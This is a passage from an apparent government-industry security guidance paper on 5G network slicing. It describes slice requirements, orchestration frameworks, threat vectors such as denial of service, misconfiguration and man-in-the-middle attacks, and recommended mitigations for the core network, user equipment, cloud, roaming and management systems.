slice profiles, such as those from GSMA. If necessary, modify or add SLRs as needed to meet the
design requirements.
As shown in Figure 5, network slice requirements are defined by associating a value to one or more
network slice characteristics. By preference, network slice characteristics from the GSMA ought to
be used. If an appropriate characteristic is not defined there, in 3GPP TS 23.501, or in this
document, a new network slice characteristic can be defined as previously discussed in this paper.
Custom network slice requirements are created by choosing values for each of the chosen set of
network slice characteristics. The completed set of network slice requirements is then associated
with a network service profile. That profile is the basis for a service level agreement (SLA) between
an NSC and an NSP. The NSC can negotiate with NSPs to agree on a service profile for each overthe-top connection.
TLP:CLEAR
Figure 5: Network Slice Model
Security Management of a Network Slice
Once a network slice has been designed and implemented, it enters the operations phase of the
lifecycle. This phase includes activation, modification, and deactivation of the network slice.
Activation of a network slice must not commence until all SLRs have been met. Ideally, the network
slice needs to stay activated throughout the intended deployment period until deactivation.
However, mission objectives or the operational conditions might change over time, so
modifications to the network slice might be needed during the deployment period so that specific
SLRs are met.
A baseline of security related network slicing features must be established for day-to-day
operations. Those features must support confidentiality, integrity, and availability requirements.
Zero trust architecture (ZTA) methodology can be implemented and exercised to ensure the secure
activation, supervision, reporting, modification, and the de-activation of a slice.
To ensure smooth network slice operations, these security features need be deployed as might be
recommended by the 3GPP. 3GPP standards define functionalities of Communication Service
Management Function (CSMF), the Network Slice Management Function (NSMF), and the Network
Slice Subnet Management Function (NSSMF). These interact with functions of the Operations
Support System and Business Support System (OSS/BSS), and the Virtualized Network Function
Manager (VNFM) within the MANO architecture. These three components plus the capability
exposure platform make up the network slice management components.
TLP:CLEAR
Network Slice Orchestration Frameworks
The ETSI MANO and ONAP service orchestration frameworks have been developed with detailed
specifications that support the design, deployment, operations, and maintenance phases of slices.
In short, the life cycle of a slice can be carried out in an automated manner.
MANO defines an NFV architecture that enables design, management, and allocation of virtual
infrastructure resources to VNFs and slices. The main functional blocks within the NFV-MANO are:
Network Functions Virtualization Orchestrator (NFVO),
Virtualized Network Function Manager (VNFM), and
Virtualized Infrastructure Manager (VIM)
Additional functionalities that have been defined for managing containerized VNFs are the
Container Infrastructure Service Management (CISM) and the Container Image Registry (CIR)
functions. The CISM is responsible for maintaining the containerized workloads while the CIR is
responsible for storing and maintaining information of operating system container software
images. The behavior of the NFVO and VNFM is driven by the contents of deployment templates
(a.k.a. NFV descriptors) such as a Network Service Descriptor (NSD) and a VNF Descriptor (VNFD).
The 3GPP defined functionalities of the NSMF and the NSSMF map to functionalities within the
OSS/BSS, and the VNFM within the MANO architecture.
ONAP is an open-source platform that enables product-independent capabilities for design,
creation, and life cycle management of network services. The ONAP E2E Network Slicing Use Case
realizes functionality of a slice across 5G RAN, core, and transport network slice subnets. The Use
Case demonstrates the modeling, orchestration (life cycle and resources) and assurance of a
network slice implemented in alignment with relevant 3GPP, ETSI, IETF, and other standards.15
5G Threat Vectors
There are many threat vectors that affect a 5G network slice. Of these, Denial of Service (DoS)
attacks on the signaling plane, Misconfiguration Attacks, and Man-in-the-Middle (MITM) Attacks
pose significant risks to network slicing. Relative to the commonly known confidentiality, integrity,
and availability triad, DoS directly attacks the availability of the system and its functionality,
including loss of access to the 5G infrastructure, loss of access to remote data, or compromised
communication services.
ZTA methodology can help harden a 5G deployment; a big part of ZTA can be accomplished by
employing authentication, authorization, and audit (AAA) techniques. Proper implementation of
authentication and authorization can also mitigate threat vectors stemmed from misconfiguration
attacks.
Both misconfiguration attacks and MITM attacks can have a broad range of adverse effects on
confidentiality, integrity, and availability. Misconfiguration attacks refers to a situation where
adversaries take advantage of misconfigured system controls. It might include security features
15 https://docs.onap.org/projects/onap-integration/en/latest/docs_E2E_network_slicing.html#e2e-network-slicing-
use-case
TLP:CLEAR
that are inadvertently turned off or system monitoring services being disabled.
MITM attacks imply that the adversary secretly relays and possibly alters the communications
between two endpoints. Such an attack could be devastating as misinformation and disinformation
could be resulted. If ZTA principles are applied, this could be an effective means to help mitigate
these MITM 5G attacks.
Cyber hygiene must be followed to ensure cyber impacts due to inherent system vulnerabilities and
misconfigurations are minimized:
ZTA requires AAA techniques that are employed within and between all 5G components and
between supporting infrastructure connected elements.
Perform cyber risk assessment periodically as new and emerging threats continue to be
produced to the operating environment.
Goals for End-to-End Network Slicing
A network slice user data is shown flowing from the UE to the data network, passing through RAN
functions, TN, and the 5G Core. Orchestration frameworks (e.g., MANO) configures and orchestrates
the Open RAN, TN, and 5G Core to realize a network slice. The combination of all these system
components is the attack surface for the network slice user data flow.
Figure 6: End-to-End 5G Network Slicing Architecture
The high-level goals for E2E 5G network slicing influences the network slice profile. The
following are some high-level security objectives for E2E 5G network slicing:
1) Ensure availability of the network slice user data in transit as required by the NSC.
2) Ensure integrity of network slice user data in transit as required by the NSC.
3) A network slice must enforce the physical and logical constraints on its path over its
lifetime.
4) A network slice must ensure confidentiality of data in transit as required by its SLRs.
5) Ensure confidentiality of the owner of the network slice user data in transit as required
by the network slice customers.
Specific use cases may comprise other high-level objectives for E2E 5G network slicing. The highlevel security objectives address the following key assets of a 5G network slice:
Network slice user data flow.
Identity of NSCs and NSUs using a network slice.
Geographic location of the components of a network slice.
TLP:CLEAR
Specific use cases may comprise other key assets than what is enumerated in the aforementioned
list for E2E 5G network slicing. In this scenario, a single UE connected to two sliced to support two
different applications:
1) Demand from a large number of live streams of an on-site sporting event to enhance or
argument the real time experience.
a. Support many subscribers.
b. Ultra-low latency (to match events in real time) and high bandwidth.
i. Use of edge compute (to minimize latency and minimize data network
backhaul requirements).
c. Potentially low confidentiality requirement.
2) Support for real time update of fantasy sport team stats.
a. Support many subscribers.
b. Ultra-low latency, low bandwidth, high frequency update of odds.
c. High confidentiality, integrity, and availability triad.
d. A centralize real time scores statistics server system in a regional cloud.
TLP:CLEAR
DESIGN CRITERIA
Network Slice
The requisite criteria to adequately define a 5G network slice is specified by the end-user
(NSU/NSC) in the form of a network slice service profile and confirmed by the supplier of the NSP.
A NSP implements a service that realizes a network slice. An NSP might implement multiple
network slices. Each network slice may be composed of one or more underlying network sub-slices.
At the lowest level and without additional SLRs, a network slice is equivalent to the underlying
physical network. Conceptually, any composition of two or more underlying network slices is a new
network slice. The NSP has the privileges necessary to use the underlying network slices in the
implementation of the new composite network slice.
A network slice can be tailored based on the specific requirements agreed between customer and
slice provider and can span across multiple network domains used by an NSP (e.g., access, core,
transport, and data networks) and is comprised of dedicated and/or shared resources in terms of
functionality, processing power, storage, and bandwidth.
5G network slicing offers a NSP the opportunity to increase the utilization of their physical
infrastructure while meeting the SLRs of multiple NSCs. Currently NSCs must have significant indepth discussions with NSPs on meeting the confidentiality, integrity, and availability of slices by
an NSP. 5G network slice standards are immature/nonexistent regarding confidentiality, integrity,
and availability SLCs. Standardization efforts and adoptions by NSPs in this area is required before
the SLRs for confidentiality, integrity, and availability can be uniformly applied between operators.
Currently, 5G network slicing specifications do not prescribe how network slice are implemented.
For instance, a fundamental tenet of the 3GPP is to create specifications, while implementation is
left to MNOs and mobile network vendors.
Figure 7 shows some the ways an NSP might choose to implement 5G network slices. The potential
variability and inconsistency will have significant effect on both the QoS and confidentiality,
integrity, and availability of the 5G network slice. Network slices are implemented as independent
logical networks that are separated and managed for each service type within a common
infrastructure. Network slicing can guarantee the quality of data transmission for time-sensitive
services or mission-critical services, such as connected cars, by allocating isolated and dedicated
resources.
TLP:CLEAR
Figure 7: Independent Logical Networks16
Slice #1 shares 5G core NFs (Network Resource Function (NRF), Policy Control
Function (PCF), and Access Management Function (AMF)) with Slice #2.
However, Slice #1 and Slice #2 do not share other NFs (Session Management
Function (SMF) and UPF) and may have their own additional dedicated PCF for each
of their slices.
Slice #3 does not share any NFs with the other two slices and therefore from a core
network perspective it is isolated from the other two, even though the access
network (e.g., RAN) is shared between all the three slices.
Network Slice Service Profile Recommendations
Establish and define a comprehensive list of the slice profiles (across all SLAs) to be
accommodated by the NSP.
Establish the types and requirements of the UE that will connect to the RAN for each
individual slice profile (across all SLAs) accommodated by the subject 5G network.
Establish the types and capabilities of data networks that will connect to the N6 Interface
for each individual slice profile (across all SLAs) accommodated by the subject 5G network
slice.
Establish the full list, and associated metric value ranges (e.g., SLRs), of all SLCs contained
within the slice profiles (across all SLAs) accommodated by the subject 5G network slice.
Establish the maximum of number of concurrent slices, for each individual slice profile
(across all SLAs), that will be accommodated by the subject 5G network slice.
Establish the requisite combinations (including types and quantities) of component NSPs
(across all SLAs) that will be concurrently accommodated by the subject 5G network slice.
16 From 3GPP web
TLP:CLEAR
Establish the method, frequency, requisite response timing, and prioritization policies for
the dynamic administration of network slicing across all SLAs accommodated by the
subject 5G network.
Define each network slice service profile using SLR names and values as specified by 3GPP,
GSMA, or other industry or standards development bodies.
Before provisioning, the NSP assures the requested network slice can conform to requested
SLRs and other requirements.
Changes to the security or other requirements of an existing network slice is denied if the
NSP cannot assure that the implementation of that network slice will conform to the
requested changes.
Once provisioned, the implementation of a network slice continues to conform to the
requirements specified when the network slice was provisioned or modified.
Evaluate and confirm that the subject 5G network can accommodate the types and
requirements specified by the NS service profile.
Evaluate and confirm that the subject 5G network can concurrently accommodate the
requisite combinations (including types and quantities) of individual slice profiles (across
all SLAs).
Evaluate and confirm that the subject 5G network can accommodate the method,
frequency, requisite response timing, and prioritization schema for the dynamic
administration of network slicing across all SLAs.
Open RAN
To support the overall security goals described in the previous section 
Goals for End-to-End
Network Slicing,
 any Open RAN implementation must meet the following security objectives:
Ensure the confidentiality, integrity, and availability triad of the network slice user data in
transit within the Open RAN.
Ensure integrity of the physical and logical path of the network slice user data within the
Open RAN.
Ensure confidentiality of the identity of the owner of the network slice user data within the
Open RAN.
Ensure confidentiality of the geographic location of the network slice user data within the
Open RAN.
Although there are many methods to compromise a network slice, the design of an Open RAN
implementation should specifically mitigate unauthorized access and misconfiguration
compromises. The remainder of this Open RAN section addresses these security objectives and
mitigations for an Open RAN based on O-RAN Alliance specifications.17
Unauthorized access to a network slice within an O-RAN system requires access to the 5G System
user plane and control plane. The 5G System provides for optional Packet Data Convergence
Protocol (PDCP) confidentiality and data integrity mechanisms to prevent unauthorized access of
the user plane and control plane within the O-RAN system. If these mechanisms are not
17 https://www.o-ran.org/
TLP:CLEAR
implemented by an operator, then an attacker could have access to the user plane and control
plane within the entire O-RAN system.
O-RAN supports optional 3GPP confidentiality and data integrity mechanisms for the N2 and N3
back haul interfaces between the 5G RAN and 5G Core17. If these optional mechanisms are not
implemented by an operator, then a threat actor could have access to the 5G system (5GS) user
plane and control plane between the O-RAN system and the 5G Core.
Like any component of a 5G RAN, the CU requires security controls to prevent unauthorized access
to the user plane and control plane. A virtualized CU requires similar security controls.18192021
Misconfiguration exploits target the availability and integrity of a network slice. An O-RAN system
misconfiguration attack on the availability of a network slice could deny service with precision
ranging from targeting an operator RAN down to a specific network slice. An O-RAN system
misconfiguration attack on the integrity of a network slice could modify the physical and/or logical
path of the network slice user data in transit from RU to CU.
An O-RAN system misconfiguration attack surface consists of the system that manages O-RAN
network functions and transport networks. As illustrated in Figure 8 below, the system is known as
the Service Management and Orchestration framework (SMO).22 Many features of the SMO follow
the network orchestration and management systems defined by 3GPP, ETSI, and ONAP.
Figure 8: O-RAN Service Management and Orchestration
The 
Management and Orchestration
 section describes the attacks, attack surface, and potential
mitigations for service orchestration frameworks. This section pertains to aspects of the SMO to
18 https://media.defense.gov/2021/Oct/28/2002881720/-1/-
1/0/SECURITY_GUIDANCE_FOR_5G_CLOUD_INFRASTRUCTURES_PART_I_20211028.PDF
19 https://media.defense.gov/2021/Nov/18/2002895143/-1/1/0/SECURITY_GUIDANCE_FOR_5G_CLOUD_INFRASTRUCTURES_PART_II_20211118.PDF
20 https://media.defense.gov/2021/Dec/01/2002901540/-1/1/0/SECURITY_GUIDANCE_FOR_5G_CLOUD_INFRASTRUCTURES_PART_III_508%20COMPLIANT.PDF
21 https://media.defense.gov/2021/Dec/16/2002910260/-1/1/0/SECURITY_GUIDANCE_FOR_5G_CLOUD_INFRASTRUCTURES_PART_IV_20211216.PDF
O-RAN Minimum Viable Plan and Acceleration towards Commercialization White Paper,
 29 June 2021.
TLP:CLEAR
include the architectural framework, onboarding procedures, and security procedures.
Other attack vectors arise from new SMO management capabilities and interfaces. The non-RealTime RAN Intelligence Controller (non-RT RIC) configures network slices based on applications
called rApps. An attack on or by an rApp could impact the availability of a network slice. The ESF
publication Open Radio Access Network Security Considerations discusses rApp and non-RT RIC
security objectives, threats, and mitigations.
The SMO consists of management interfaces to O-RAN NFs as shown in Figure 8. The O1 interface
manages the DU, CU, and other ORAN NFs. The Non-RT RIC manages the Near-Real-time (Near-RT)
RIC network functions using the A1 interface. The Open Fronthaul M-Plane interface manages the
O-RAN Radio Units (O-RU)s. The O2 interface manages the O-Cloud, where the O-Cloud is the cloud
infrastructure for the O-RAN system. Security controls must be in place to help prevent an attacker
from modifying O-RAN system configurations with unauthorized access to these interfaces.
To address these and other O-RAN security concerns, see the recommendations for security
controls and mitigation in ESF publication Open Radio Access Network Security Considerations.23
Core Networking
The high-level potential threats that have been identified to slicing with respect to the core
network, include attacks that may originate from UEs, unauthorized humans, and unauthorized
machines towards the core NFs. The attacks may include spoofing of customer specific NSSAI by
the UEs and other identity thefts. Other attacks of this class include un-authorized access to
customer NFs by NFs from another slice using the control plane. For example, when Unified Data
Management (UDM) in one slice makes a request for subscription information of members of
another slice to a unified data repository (UDR) that is in a different slice.
Misconfiguration and tampering attacks can lead to Denial-of-Services (DoS) to legitimate slice
users. Examples of such attacks include:
Tampering of NSSAI information when data is in flight between NFs (e.g., from UDR to UDM,
5G radio node (gNB), and AMF etc.);
Tampering of slice-specific data-usage;
Tampering slice-specific authentication data between NSSAAF and AMF;
Replay attacks; and
Misconfiguring of slice-specific info (e.g., NSSAI at the UDR, policies related to slices at the
PCF, NSSF, charging and logs related to slices etc.).
Passive or active eavesdropping could lead to leakage of highly sensitive customer slice such as:
leakage of NSSAI over the air, and subscriber information (e.g., Subscription Permanent Identifier
(SUPI), UE location information, subscription information, slice information) as to who is using
which slice may be leaked between slices. Also, leakage of slice-specific Network Information (e.g.,
routing information from NRF) and leakage of sensitive slice information to external networks (e.g.,
application function).
Signaling storms on N2, N3, and over service-based interfaces (SBI) can cause DoS to legitimate
slice users, and attacks from UE over N1 can impact N2 and N3 interfaces. Similarly attacks from N6
23 https://www.nsa.gov/About/Cybersecurity-Collaboration-Center/Enduring-Security-Framework/
TLP:CLEAR
and N9 interfaces could impact the customer-slice user plane.
Recommended Core Network Security Mitigations:
1) Security mitigations to protect the 5G system identified by the CSRIC VII24 include using
non-access stratum (NAS) signaling integrity and confidentiality between the UE and the
core network as well as using mutual Transport Layer Security (TLS)-based authentication
and secure communications between NFs using the service-based infrastructure. For NFsto-NFs communications over non-SBI interfaces, CSRIC VII recommends using Internet
Protocol Security (IPSec).
2) Use of network slice-specific authentication and authorization by leveraging a Network
Slice-Specific Authentication and Authorization (NSSAA) to protect against un-authorized
access to slices by UEs using NSC-specific credentials (these credentials are different from
NOP credentials that are used for 5G-AKA).
3) Provide capability to enable logical / physical isolation of the control plane and user-plane
NFs belonging to each of the NSCs. Each can provide logical isolation of NSC slice subscriber
info (e.g., using separate UDR instances per slice) and based on SLRs, provide physical
isolation of NFs per slice (e.g., separate UDM / Authentication Credential Repository and
Processing Function (APRF) by means of hardware security models)).
4) Employ a dedicated intermediate certificate authority (ICA) that is used for life-cycle
management of the certificates issued to the NFs belonging to a particular slice.
5) Employ an authorization server to provide attribute and role-based access control (RBAC)
of humans and machines to perform per slice configuration, fault, and performance
management. Ensure that slice-specific logging can also be performed.
6) Employ a security vault to provide confidentiality and integrity of all sensitive and security
data (e.g., private keys, open authorization [OAuth] tokens, cert chains) used as part of
control and management plane messaging and to isolate sensitive and security data from
the rest of the platform. This makes the data available only to the respective authorized NFs
within a slice.
Store subscription information associated with a NSC
s subscriber within encrypted databases and
employ backup and data recovery processes from 
golden
 data. Protect subscriber data-at-rest
using a secure environment (e.g., hardware security module (HSM)). Similarly, an HSM can be used
to protect applicable credentials used for network slice-specific authentication.
User Equipment
Current 3GPP 5G standards allow a UE to access up to eight network slices. The 5G UE must be
hardened to prevent the UE from being used as a means for network slices to interact
inappropriately.
In the design of device system architecture, network slicing features require the coordination
between the upper operating system and the bottom communication modem. Table 5 shows two
ways to implement network slicing features in the device system architecture:
24 https://www.fcc.gov/about-fcc/advisory-committees/communications-security-reliability-and-interoperability-council-vii
TLP:CLEAR
Table 5:
Traffic to Network Slice Matching Schemes
Scheme
Modem-centric
OS-centric
Description
The modem matches traffic by its attributes to a network slice.
The operating system matches traffic by its attributes to a network slice.
The two approaches include two OS-Centric scheme solutions, namely, changes to the operating
system and Application APIs respectively. The overall impact of this is determining where the
network slice termination point will be in on the 5G device in one of three locations:
The Modem,
The Operating System, and/or
The Application.
To hide details of data connection management and maintenance from applications, native
operating system characterizes a data connection by network capability. Each network capability
stands for a certain kind of capability. Since operating system manages data connections based on
Access Point Name (APN) and Data Network Name (DNN), the capabilities associated to individual
services provided by system identified by the APN/DNN are the most important.
Given the complexity of the OS-Centric scheme and fragmentation, the recommendation is to select
modem centralization scheme" which provide users with more diversified, flexible, and
evolvable high-quality network slicing services.
 However, the network slicing at the
OS/Application layer provides greater flexibility and enhanced user experience at the same time.
It is understood that implementing an OS-Centric scheme for OS/applications is challenging since
an operating system does not natively support URSP for the following reasons:
A URSP rule is composed by a traffic descriptor (TD) and RSDs.
The upper layer (e.g., an application) specifies the TD and the modem uses the TD to look for
a URSP rule matched to the TD.
The modem with a matched TD tries to establish a PDU session using the corresponding
RSDs in the order of precedence.
Since operating system designs data connection framework based on APN type, the
operating system can be modified for the reason explained below to use TDs.
TLP:CLEAR
Table 6:
The following is an example URSP rule for enterprise traffic.
URSP Rule (enterprise)
Precedence:
1 (0x01)
Traffic Descriptor
Operating System Id
+ Operating System
App Id Type
0x97A498E3FC925C9489860333D06E4E470A454E5445525052495345
Route Selection Descriptor
Precedence:
1 (0x01)
Component #1:
S-NSSAI
SST:1 SD:2 (0x01000002)
Component #2: DNN
enterprise
Recommended User Equipment Security Mitigations:
1) Start with the current modem-centric approach, and then move to an OS-centric approach
once the issues about a standards-based uniform approach can be developed in the future.
2) When available, terminate the slice in the application. This might provide greater security
from a confidentiality or privacy perspective when compared to the current modem-centric
approach.
3) Implement mobile device management (MDM) to protect network slice thus protecting the
device since it is all self-contained. MDM agents may not be applicable on all UEs.
4) Protect NSSAI from being tampered and therefore recommend storing it within a secure
environment (e.g., UICC).
5) Perform authentication and authorization of application requests to access a network slice.
Cloud and Virtualization
Most 5G systems will be instantiated on virtualized compute, network, and storage resources; and
will utilize on-premises virtual machine management (private cloud) or in commercial cloud
platforms (public cloud). Mapping most of the 5G system into the virtualized, managed resources of
a private or public cloud will require security controls on all uses of those resources.
Depending on the type of cloud deployment for 5G system, the set of security controls that are
required to harden the 5G system need to be considered and deployed appropriately. There are
Industry standards and guidance that provide the list of security controls. These are generic in
nature and need to be configured specifically for the cloud provider/technology.
The configuration of the cloud controls depends on the responsibility for the security of the data,
which depends upon the type of cloud deployment that is being leveraged such as Infrastructure as
a Service (IaaS), Platform as a Service (PaaS), Software as a Service (SaaS), etc.
TLP:CLEAR
Recommended Mitigations for Virtual Systems:
Ensure that controls implemented by the 5G system cannot be bypassed using direct access
to cloud resources.
Establish necessary network connections between the components of the 5G system are
established and permit no other connections.
Protect data storage used by the 5G system from access, tampering, or deletion by any
unauthorized parties.
Establish and maintain mechanisms for monitoring operation of the 5G system, especially
resource usage, actions of authorized cloud administrators, and network traffic flows. (This
supports both real-time and forensic analysis of cloud operation to support assurance for
the 5G services.)
A cloud platform (public or private) does two things to support the hardening of network slicing:
provide a foundation for overall 5G operations, and provides resources to set up, manage, monitor,
and tear down security services and dynamic resources allocations for slices.
Assured 5G operations are foundational to network slicing 
 To gain this assurance, 5G operators
leverage cloud services in their design and deployment as described below. In all cases, the
principle of least privilege is essential: assign to every person or non-person entity only the
privileges and accesses necessary for operation.
Recommended Cloud Platform Hardening Mitigations:
Employ cloud tenant separation mechanisms (e.g., 
virtual private cloud
) to ensure
separation between the 5G system and other workloads within the supporting cloud
platform.
Employ cloud identity and access management (IAM) features to ensure that only
authenticated and authorized administrators can create or alter cloud resource
configurations. Manage authorized identities centrally.
Configure monitoring mechanisms across the cloud platform (public or private) to record
all critical actions and resource usage. (General principles for monitoring are given by NIST
SP800-92; specific guidance for each cloud platform is offered by that platform
s vendor.)
Configure storage supporting the 5G system to use access control, integrity assurance, and
encryption, with keys managed by the cloud platform.
Configure network segmentation to separate user plane from 5G control plane traffic.
Ensure that control plane entities, such as VNFs/CNFs, have only necessary network
connectivity.
Secure instantiation of security services and allocation of securely configured resources to assure
the integrity and selected security attributes of slices. To meet this objective, 5G operators can
leverage the resource management and security services offered by cloud platforms.
A network slice provides network connectivity for authorized UEs while enforcing specific network
performance, integrity, and confidentiality guarantees. Therefore, certain entities (such as VNFs) in
the 5G logical architecture possess privileges to dynamically allocate, manage, monitor, and
TLP:CLEAR
deallocate network paths to support slice operations.
Recommended Security Mitigations for Network Slice Creation:
Do not configure such dynamic network assets 
manually;
 instead, invoke an approved
template or script to set up the slice assets. (E.g., Terraform, CloudFormation, etc.)
Do not deploy vulnerable components in production; continuously monitor for new
vulnerabilities and remediated. Follow guidance provided in National Institute of
Standards and Technology (NIST) Cybersecurity Framework (NIST CSF) 
PR.IP-12: A
vulnerability management plan is developed and implemented.
Employ secure software development and operations processes for any code being used in
production, including the management scripts and Infrastructure as Code (IaaC) scripts.
Configure security controls, monitoring, and resource usage constraints onto the dynamic
network path and its elements before enabling operation or connecting any UEs to the slice.
Ensure that the network path resources/assets associated with the slice are 
owned
 by a
dynamically created identity specifically designated for this purpose. (e.g., provisioning a
dedicated identity to serve as the owner for the slice aids separation between slices and
helps with slice monitoring.)
Instantiate the requisite computing resources with an approved template, control image, or
script such as a dedicated VNF/CNF.
Interconnect & Roaming
Roaming between network operators is based on dedicated roaming agreements, which typically
are established, along with technical requirements, prior to any roaming. This applies to network
slicing roaming agreements too. Roaming agreements are necessary to allow operators to configure
an E2E network that provides the desired overall functionality and service parameters. The GSMA
broadly outlines the content of such roaming agreements in standardized form.
For network slice roaming to become a reality, several technical and business aspects first need to
be in place:
MNOs need to rollout slicing in their mobile networks and have a network slice product
offering.
Extended roaming agreements including slice definitions with SLAs based on slice
attributes.
Operational support (management and orchestration, and service assurance) in roaming
environments.
Global availability of slicing compatible UEs.
An NSP can consider the following when procuring network slicing services:
The visited network could provide to the roaming user a network slice with equivalent
functionality of the slice used in the home network, e.g., the roaming partners may agree to
support a common set of standardized slices.
TLP:CLEAR
The home network might export the blueprint of a custom network slice used by a user so
that it can be instantiated and administered by the visited network.
The home network might extend the slice into the visited network, provided it has
authorization from the visited network to control the resources.
Interconnection refers to the technical physical and logical connection between two or more MNOs.
Interconnection is a necessary component of roaming between two or more public land mobile
networks (PLMN)s.
3GPP specifications offer an interconnection solution based on the Security Edge Protection Proxy
(SEPP). All signaling traffic across and between operator networks MNOs is expected to transit
through these security proxies.
The SEPP mitigates attacks on the N32 interface by protecting 3GPP control plane messages
between interconnecting MNOs. Security controls for protecting confidentiality and integrity for
the N32 include either TLS or Protocol for N32 Interconnect Security (PRINS). Additionally, 3GPP
TS 33.501 specifies protection for the N32 interface in clauses 13.1 and 13.2.25 26
Recommended Controls and Mitigations for 3GPP Interconnect Security:
Transit the signaling traffic between MNOs through SEPPs.
Enable filtering of traffic coming from the interconnect with authentication between SEPPs.
Employ application layer security solution on the N32 interface between the SEPPs to
provide protection of sensitive data attributes while still allowing mediation services
throughout the interconnect.27
Data Networking
Given the dynamic nature of the 5G data network interworking environment, and since the data
network may not necessarily belong to the NSP or the NSC, there are various threat actors and
associated threats that would have to be considered such as: misconfiguration and tampering
attacks, passive and active eavesdropping, spoofing, and signaling and user-plane flooding attacks
causing DoS.
Examples of tampering or misconfiguration attacks include:
Replay of Domain Name System (DNS), Dynamic Host Configuration Protocol (DHCP), or
Protocol-Independent Multicast (PIM) messages,
Tampering with NSSAI information carried between AAA Proxy (AAA-P) and DN-AAA
servers as part of the slice-specific authentication procedure, and
Tampering with authentication and authorization data carried within Extensible
Authentication Protocol (EAP) messages, modification, and replaying slice-specific user
plane messages between data network and UPF over N6.
25 REPORT ON RECOMMENDATIONS FOR IDENTIFYING OPTIONAL SECURITY FEATURES THAT CAN DIMINISH THE
EFFECTIVENESS OF 5G SECURITY, FCC CSRIC VII
26 3GPP TS 33.501
27 Additional resources for security framework, data models, and APIs are the MEF 117 SAS Service Attributes and
Service Framework; MEF 118 Zero Trust Framework for MEF Services; and MEF 128 LSO API Security Profile
TLP:CLEAR
Passive and active eavesdropping could lead to information disclosure to un-authorized entities.
Example of such attacks include subscriber info (e.g., SUPI, UE location, subscription info, and more
importantly slice info) leakage, as to who is using which slice may be leaked between slices and to
external entities. Such disclosures are possible if EAP messages are not protected. Additionally,
leakage of sensitive network info to other slices (customer or non-customer) or to external entities:
Leakage of slice-specific network Information (e.g., routing information: DHCP, DNS messages).
Remote Authentication Dial-In User Service (RADIUS) and Diameter messages may also leak such
information which can then be used by an attacker to target the N6 or the data network network.
Figure 9: Reference Architecture for 5G Network Interworking28
Mitigations to Facilitate Future Data Network Interworking Security in the
Earliest Stages of Design:
1) Leverage 
sandbox
 and test environments to model E2E 5G-to-external data network
interworking, including leveraging native slicing specifications in other network types,
Virtual Private Network (VPN) and tunneling protocols, and Management and Orchestration
frameworks to facilitate secure data network interworking.
2) Engage in follow-on work through the ESF or other suitable mechanism to develop more
detailed guidance for the rapidly evolving network slicing work of MEF, TMForum, GSMA
and others to extend the capabilities of 3GPP/5G slicing into the broader global networking
frameworks.
3) In requests for proposal and system design documents, requestors assess and specify fullE2E connectivity requirements, including slice parameters and/or key 5G slice-defined QoS
requirements that are to be maintained E2E across non-5G environments (e.g., security,
physical/logical separation, encryption, QoS, latency, etc.)
4) Network providers pre-negotiate internetworking agreements necessary to provide E2E
connectivity across the full geographic footprint where connectivity is needed.
Regardless of how data network interworking is implemented, network design and deployment
need to consider the threat environment at the N6 interface to ensure the confidentiality, integrity,
and availability triad of the overall information system.
28 3GPP TS 29.561 V17.5 figure 6-1
TLP:CLEAR
Recommended Mitigations to Counter the Risks Previously Described:
Protect integrity and authenticity for all signaling (e.g., Use DNSEC to protect DNS
messages.) and control plane messages.
Transport EAP messages carrying authentication and authorization data over secured
transport mechanisms that provide the confidentiality, integrity, and availability triad as
well as replay protection (e.g., Diameter messages that are protected for integrity and
authenticity).
Protect all policies and data associated with network slicing at the UPF for the N6 interface
from tampering using data-at-rest integrity protection.
Control human or machine access to the N6 configuration on the UPF by leveraging an IAM
system that uses granular access control. Such controls include attribute-based access
control or using multi-factor authentication for humans.
Protect the user plane traffic dedicated to a customer slice at the IP layer for integrity and
confidentiality. Recommend using IPSec between the UPF to the customer network in an
E2E manner. In some cases, the protection may be done in a hop-by-hop fashion.
Instantiation of a customer dedicated N6 interface associated may be reside on a shared
UPF or on a dedicated UPF for customer.
Use mutual authentication for communication between the AAA-S / DN-AAA and the
NSSAA and SMF respectively, by means of X.509 certificates that have been issued by a
mutually trusted certificate authority. Similarly, use mutual authentications for all
communications between the SMF and the DHCP servers over the N6 using X.509v3
certificates.
Each instance of the N6 interface at the UPF that is dedicated to a slice shall have the
capability to rate-limit and firewall user traffic per slice based on current policies.
For each network slice, support rate-limited signaling /control plane messages for each N6
interface used to communicate to DN-AAA, DNS, DHCP servers etc.
Management and Orchestration
A very highly sought-after target for compromising a 5G network slice is attacking the MANO
system. This is because the design, deployment, and operation of the slice will be done by the
management platform, mostly via IaC, programmed automation playbooks, and orchestration of
functions. Commandeering the MANO system enables the ability to introduce security
configuration vulnerabilities that attackers can use to compromise the integrity of the network
slice. The threats encompass unauthorized modifications of the playbooks, compromised software
supply chains, alterations of the IaC scripts physical network function (PNF) and VNF (xNF) images.
The set of security controls required to protect the MANO system are the same as protection of an
application, guidance can be found in NIST publications such as:
NIST 800-53 Security and Privacy Controls for Information Systems and Organizations
NIST 800
190 
 Application Container Security Guide
In addition, ensure that the security controls are tailored towards the specific needs of the NOP
system- such as the API security system- consider the structure of the API
s as defined by 3GPP and
TLP:CLEAR
TMF in evaluating attacks against them.
Ensure that only authorized entities (humans and machines) have the capability to modify or
update slice characteristics. The authorized entities need to be granular and different for each of
the processes (ex: slice design, activation, etc.) associated with the slice lifecycle.
Network Slice Creation and Deployment
The requirements specified by a network slice at inception are expected to be met throughout its
lifecycle. Network cyber-attacks need to be considered. These potential vulnerabilities include
traffic injection attacks, impersonation attacks, and DoS attacks, including exhaustion of resources.
More specifically to roaming scenarios, new vectors of attack related to interconnect can arise
especially considering management and orchestration across different administrative domains.
Slicing across domains will most likely use heterogeneous platforms and solutions: slicing
components can be implemented in firmware, operating system kernel level, in the virtualization
software systems or even in regular software. In this wide spectrum of environments, the slicing
components may be provided by different vendors thereby making difficult a common level of
security for a network slice.
Since roaming requires additional interconnect interfaces, these can be used as attack points and
expose vulnerabilities between slices and services.
The threats covered here focus primarily on newer threats related to NFV with a focus on slicing.
Threats relating to the infrastructure, e.g., cloud infrastructure, or generic 5G system threats or
generic threats relating to trust enabling functions and services, (e.g., time service, NTP, DNS, DHCP
etc.), are not addressed in this document.
Regardless of which frameworks (e.g., MANO, ONAP) are used, the threats described here are
applicable to the service and slice design and deployment infrastructure, and ought to be mitigated
to ensure the confidentiality, integrity, and availability triad of the overall information system.
Some of the key threats that would have to be addressed include, un-authorized access and
elevation of privileges.
A threat actor gains access and elevates privileges and thus on-boards a malicious network slice
containing malicious VNFs that will attack the NFs of other tenants. A threat actor could perform an
un-authorized request for reservation of compute, store, and network resources (e.g., using the OrVi or Vnfm-Vi interface). The impact could be network slice SLA and service degradation to
